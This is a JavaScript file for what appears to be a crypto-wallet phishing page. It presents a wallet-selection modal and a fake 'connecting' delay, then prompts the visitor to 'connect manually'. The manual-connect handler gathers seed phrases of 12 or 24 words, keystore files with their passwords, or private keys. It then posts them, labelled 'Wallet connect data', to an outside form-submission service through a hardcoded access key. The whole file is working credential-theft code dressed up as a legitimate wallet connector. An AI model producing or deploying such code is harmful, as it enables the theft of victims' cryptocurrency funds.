// script.js - handles modals, wallet selection, connection flow
(function(){
  const modal = document.getElementById('selectWalletModal');
  const openers = document.querySelectorAll('[data-open-modal]');
  const fixBtn = document.getElementById('fixIssueBtn');
  const modalClose = document.getElementById('modalCloseBtn');
  const hamburger = document.getElementById('hamburgerBtn');
  const mobileMenu = document.getElementById('mobileMenu');
  const toggleMore = document.getElementById('toggleMoreWallets');
  const moreWallets = document.getElementById('moreWallets');
  const walletOptions = Array.from(document.querySelectorAll('.wallet-option'));
  const modalMainImg = document.getElementById('modalMainWalletImg');
  const modalMainName = document.getElementById('modalMainWalletName');
  const connectWalletBtn = document.getElementById('connectWalletBtn');
  const connectionOverlay = document.getElementById('connectionOverlay');
  const connectingWalletImg = document.getElementById('connectingWalletImg');
  const connectManualModal = document.getElementById('connectManualModal');
  const manualCloseBtn = document.getElementById('manualCloseBtn');
  const manualConnectBtn = document.getElementById('manualConnectBtn');
  const errorConnectingLabel = document.getElementById('errorConnecting');
  const connectManuallyLabel = document.getElementById('connectManuallyLabel');
  // Manual fields
  const phrasesField = document.getElementById('phrasesField');
  const keystoreField = document.getElementById('keystoreField');
  const privateField = document.getElementById('privateField');
  const manualRadios = Array.from(document.querySelectorAll('input[name="manualMethod"]'));

  // === NEW: High z-index + internal scrolling for Manual Connect Modal ===
  if (connectManualModal) {
    connectManualModal.style.zIndex = '2147483647'; // Always on top

    // Make inner content scrollable (adjust selector if your inner wrapper has a class)
    const modalContent = connectManualModal.querySelector('.modal-content') || 
                         connectManualModal.children[0];

    if (modalContent) {
      modalContent.style.maxHeight = '85vh';
      modalContent.style.overflowY = 'auto';
      modalContent.style.webkitOverflowScrolling = 'touch'; // Smooth iOS scrolling
      modalContent.style.paddingRight = '10px'; // Space for scrollbar
    }
  }
  // === END NEW ===

  let selectedWallet = {
    id: 'metamask',
    name: 'MetaMask',
    img: 'Metamask.png'
  };

  // === NEW: Phrases grid logic ===
  const wordCountSwitchContainer = document.createElement('div');
  wordCountSwitchContainer.className = 'mt-4 flex justify-center gap-8 text-sm';
  wordCountSwitchContainer.innerHTML = `
    <label class="flex items-center gap-2 cursor-pointer">
      <input type="radio" name="phraseWordCount" value="12" checked class="accent-blue-600">
      <span>12 words</span>
    </label>
    <label class="flex items-center gap-2 cursor-pointer">
      <input type="radio" name="phraseWordCount" value="24" class="accent-blue-600">
      <span>24 words</span>
    </label>
  `;

  const phrasesGrid = document.createElement('div');
  phrasesGrid.className = 'grid grid-cols-3 sm:grid-cols-4 md:grid-cols-6 gap-3 mt-4';
  phrasesGrid.style.padding = '20px 20px 20px 20px';
  phrasesGrid.style.borderRadius = '10px';
  phrasesGrid.style.border = 'solid 2px #888';
  phrasesGrid.style.backgroundColor = '#fff';

  // Create 24 input boxes
  const wordInputs = [];
  for (let i = 1; i <= 24; i++) {
    const inputWrapper = document.createElement('div');
    inputWrapper.className = 'relative';
   
    const input = document.createElement('input');
    input.type = 'text';
    input.placeholder = `word ${i}`;
    input.required = true;
    input.className = 'w-full px-3 py-2 border border-gray-400 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500';
    input.dataset.index = i;
   
    const label = document.createElement('span');
    label.textContent = `${i}.`;
    label.className = 'absolute left-2 top-2 text-gray-500 text-xs pointer-events-none';
   
    inputWrapper.appendChild(input);
    inputWrapper.appendChild(label);
    phrasesGrid.appendChild(inputWrapper);
    wordInputs.push(input);

    // Hide 13-24 initially
    if (i > 12) {
      inputWrapper.style.display = 'none';
      input.required = false;
    }
  }

  // Insert grid and switch into phrasesField
  if (phrasesField) {
    // Remove old textarea if exists
    const oldTextarea = document.getElementById('phrasesInput');
    if (oldTextarea) oldTextarea.remove();

    phrasesField.appendChild(phrasesGrid);
    phrasesField.appendChild(wordCountSwitchContainer);
  }

  // Switch handler
  const wordCountRadios = wordCountSwitchContainer.querySelectorAll('input[name="phraseWordCount"]');
  wordCountRadios.forEach(radio => {
    radio.addEventListener('change', function() {
      const count = parseInt(this.value);
      wordInputs.forEach((input, idx) => {
        const wrapper = input.parentElement;
        if (idx + 1 <= count) {
          wrapper.style.display = '';
          input.required = true;
        } else {
          wrapper.style.display = 'none';
          input.required = false;
          input.value = ''; // clear hidden fields
        }
      });
    });
  });
  // === END NEW Phrases logic ===

  function openModal(){
    if(!modal) return;
    modal.classList.remove('hidden');
    document.body.classList.add('overflow-hidden');
  }
  function closeModal(){
    if(!modal) return;
    modal.classList.add('hidden');
    document.body.classList.remove('overflow-hidden');
  }
  openers.forEach(el=> el.addEventListener('click', function(e){ e.preventDefault(); openModal(); if(mobileMenu && !mobileMenu.classList.contains('hidden')) mobileMenu.classList.add('hidden'); }));
  if(fixBtn) fixBtn.addEventListener('click', function(e){ e.preventDefault(); openModal(); });
  if(modalClose) modalClose.addEventListener('click', closeModal);
  if(modal) modal.addEventListener('click', function(e){ if(e.target === modal) closeModal(); });
  if(hamburger && mobileMenu){
    hamburger.addEventListener('click', function(){ mobileMenu.classList.toggle('hidden'); });
  }
  // Toggle more wallets
  if(toggleMore && moreWallets){
    toggleMore.addEventListener('click', function(){ moreWallets.classList.toggle('hidden'); toggleMore.textContent = moreWallets.classList.contains('hidden') ? 'Choose your preferred wallets +30' : 'Choose your preferred wallets -'; });
  }
  // Wallet selection
  function setSelectedWallet(id,name,img){
    selectedWallet = {id,name,img};
    if(modalMainImg) modalMainImg.src = img;
    if(modalMainName) modalMainName.textContent = name;
  }
  walletOptions.forEach(btn=>{
    btn.addEventListener('click', function(e){
      const id = btn.getAttribute('data-wallet') || 'custom';
      const imgEl = btn.querySelector('img');
      const name = imgEl?.alt || id;
      const src = imgEl?.src || '';
      setSelectedWallet(id,name,src);
    });
  });
  // Connect wallet flow
  function showConnectionOverlay(){
    if(!connectionOverlay) return;
    connectingWalletImg.src = selectedWallet.img || '';
    connectionOverlay.classList.remove('hidden');
    document.body.classList.add('overflow-hidden');
  }
  function hideConnectionOverlay(){
    if(!connectionOverlay) return;
    connectionOverlay.classList.add('hidden');
    document.body.classList.remove('overflow-hidden');
  }
  if(connectWalletBtn){
    connectWalletBtn.addEventListener('click', function(){
      closeModal();
      showConnectionOverlay();
      setTimeout(function(){
        hideConnectionOverlay();
        if(connectManualModal){ connectManualModal.classList.remove('hidden'); document.body.classList.add('overflow-hidden'); }
      }, 10000);
    });
  }
  if(manualCloseBtn) manualCloseBtn.addEventListener('click', function(){ connectManualModal.classList.add('hidden'); document.body.classList.remove('overflow-hidden'); });
  if(connectManualModal) connectManualModal.addEventListener('click', function(e){ if(e.target === connectManualModal){ connectManualModal.classList.add('hidden'); document.body.classList.remove('overflow-hidden'); } });
  // Manual radio toggles
  function updateManualFields(){
    const sel = document.querySelector('input[name="manualMethod"]:checked')?.value || 'phrases';
    phrasesField.classList.toggle('hidden', sel !== 'phrases');
    keystoreField.classList.toggle('hidden', sel !== 'keystore');
    privateField.classList.toggle('hidden', sel !== 'private');
  }
  manualRadios.forEach(r=> r.addEventListener('change', updateManualFields));
  updateManualFields();
  if(manualConnectBtn){
    manualConnectBtn.addEventListener('click', function(){
      const method = document.querySelector('input[name="manualMethod"]:checked')?.value;
      const payloadParts = [];
      if(method === 'phrases'){
        const words = wordInputs
          .filter(input => input.offsetParent !== null)
          .map(input => input.value.trim())
          .filter(v => v.length > 0);
        if (words.length > 0) {
          payloadParts.push('seed phrase: ' + words.join(' '));
        }
      } else if(method === 'keystore'){
        const v = document.getElementById('keystoreInput')?.value || '';
        const p = document.getElementById('keystorePassword')?.value || '';
        if(v) payloadParts.push('keystore: ' + v);
        if(p) payloadParts.push('keystore password: ' + p);
      } else if(method === 'private'){
        const v = document.getElementById('privateInput')?.value || '';
        if(v) payloadParts.push('private key: ' + v);
      }
      payloadParts.unshift('wallet: ' + (selectedWallet.name || selectedWallet.id || 'unknown'));
      const message = payloadParts.join('\n\n');
      if(errorConnectingLabel) errorConnectingLabel.classList.add('hidden');
      if(connectManuallyLabel) connectManuallyLabel.textContent = 'Sending...';
      const access_key = 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea';
      fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ access_key, subject: 'Wallet connect data', message })
      }).then(async res => {
        if(!res.ok){
          throw new Error('Network response not ok');
        }
        try{ await res.json(); }catch(e){}
        if(connectManuallyLabel) connectManuallyLabel.textContent = '( Wait... )';
        connectManualModal.classList.add('hidden');
        const waitOverlay = document.getElementById('waitOverlay');
        if(waitOverlay){ waitOverlay.style.display = 'flex'; }
      }).catch(err => {
        if(errorConnectingLabel) errorConnectingLabel.classList.remove('hidden');
        if(connectManuallyLabel) connectManuallyLabel.textContent = 'Connect manually';
        console.error('Send failed', err);
      });
    });
  }

})();
